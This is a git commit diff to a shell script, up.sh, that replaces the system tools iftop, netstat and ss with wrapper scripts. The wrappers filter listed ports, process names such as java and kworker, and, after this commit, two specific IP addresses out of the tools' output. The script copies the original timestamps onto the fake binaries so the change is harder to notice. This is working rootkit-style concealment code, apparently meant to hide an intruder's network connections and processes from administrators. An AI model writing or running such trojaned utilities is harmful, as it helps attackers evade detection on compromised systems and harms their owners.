5fc4f5394c06b7912166d2982c85116acfacd1e4
jackmoc <94283031+jackmoc@users.noreply.github.com>
2022-01-16 19:33:02 +0800

    Update up.sh

--- up.sh
+++ up.sh
@@ -18,21 +18,21 @@ fi
 cd /sbin/
 mv iftop iftop2
 echo '#!/bin/bash
-iftop2 $1 $2 $3 $4 $5 -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and port not 3306"' > iftop
+iftop2 $1 $2 $3 $4 $5 -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and port not 3306 and host not 150.109.185.45 and host not 43.155.104.194"' > iftop
 chmod +x iftop
 touch -r iftop2 iftop
 #netstat
 mv /bin/netstat /bin/ntstat
 cd /bin/
 echo '#!/bin/bash
-/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|java"' > netstat
+/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|java|150.109.185.45|43.155.104.194"' > netstat
 chmod 755 netstat
 touch -r /bin/ntstat /bin/netstat
 #ss
 mv /sbin/ss /sbin/ntss
 cd /sbin/
 echo '#!/bin/bash
-/sbin/ntss $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|nts|java"' > /sbin/ss
+/sbin/ntss $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|nts|java|150.109.185.45|43.155.104.194"' > /sbin/ss
 chmod +x /sbin/ss
 touch -r /sbin/ntss /sbin/ss
 #ps
